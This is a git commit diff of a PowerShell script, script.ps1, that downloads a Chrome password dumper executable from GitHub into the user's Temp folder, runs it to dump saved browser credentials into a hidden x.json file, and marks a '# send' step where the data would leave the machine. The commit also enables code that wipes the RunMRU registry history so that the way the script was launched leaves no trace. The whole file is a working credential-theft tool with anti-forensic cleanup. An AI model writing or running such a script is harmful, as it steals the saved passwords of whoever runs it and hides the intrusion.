8285984b8c8df6f908bf887a741ed6acee44f88e
M3601 <41511838+M3601@users.noreply.github.com>
2022-01-31 12:02:35 +0100

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,18 +1,19 @@
 $username = $env:UserName;
 $url = "https://github.com/BudiNverse/chrome-pwd-dumper-rs/releases/download/0.3.0/chrome-pwd-dumper.exe";
-$path = "C:\Users\{0}\AppData\Roaming\cpd.exe" -f $username;
-$cmd = "{0} -f json x" -f $path;
-Invoke-WebRequest -Uri $url -OutFile $path;
+$path = "C:\Users\{0}\AppData\Local\Temp\" -f $username;
+Set-Location $path;
+Invoke-WebRequest -Uri $url -OutFile "cpd.exe";
+$cmd = ".\cpd.exe -f json x";
 Invoke-Expression $cmd;
-Remove-Item $path;
+Remove-Item ".\cpd.exe";
 Set-ItemProperty -Path .\x.json -Name attributes -Value 6;
 # send
 Set-ItemProperty -Path .\x.json -Name attributes -Value 0;
-# Remove-Item x.json
+Remove-Item ".\x.json";
 
-#$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU";
-#$arr = Get-ItemPropertyValue $path -Name MRUList;
-#Set-ItemProperty -Path $path -Name MRUList -Value "";
-#foreach ($x in $arr.ToCharArray()) {
-#    Remove-ItemProperty -Path $path -Name $x;
-#}
+$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU";
+$arr = Get-ItemPropertyValue $path -Name MRUList;
+Set-ItemProperty -Path $path -Name MRUList -Value "";
+foreach ($x in $arr.ToCharArray()) {
+    Remove-ItemProperty -Path $path -Name $x;
+}
